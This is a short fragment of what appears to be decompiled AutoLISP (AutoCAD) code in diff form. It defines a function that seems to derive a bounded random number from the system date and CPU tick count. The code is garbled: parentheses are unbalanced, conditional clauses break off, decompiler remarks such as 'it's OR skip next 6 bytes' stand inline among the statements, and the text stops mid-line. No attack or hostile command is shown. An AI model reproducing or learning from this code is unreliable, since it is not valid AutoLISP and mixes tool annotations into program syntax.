+(defun VL_SJSTA-END
+(QSH  JSH)
+(_al-bind-alist '(CPR_2 OKSHU AI BI LIBI LIAI CPR_3 ATIME BTIME))
+(setq CPR_2 -1)
+(setq IUDTUE T)
+(setq ATIME (FIX (* (GETVAR "cdate") 10000000)))
+(setq OKSHU "")
+(setq AI (RTOS QSH))
+(setq BI (RTOS JSH))
+(setq LIAI (STRLEN AI))
+(setq LIBI (STRLEN BI))
+(cond (< CPR_2 LIAI) (
+(cond (> CPR_2 LIBI) (
+it's OR skip next 6 bytes -> 378
+it's OR skip next 6 bytes -> 378
+(setq CPR_2 (REM (FIX (/ (GETVAR "CPUTICKS") 10)) (+ LIBI 1)))
+(cond (< (ATOI OKSHU) QSH) (
+(cond (> (ATOI OKSHU) JSH) (
+it's OR skip next 6 bytes -> 483
+it's OR skip 
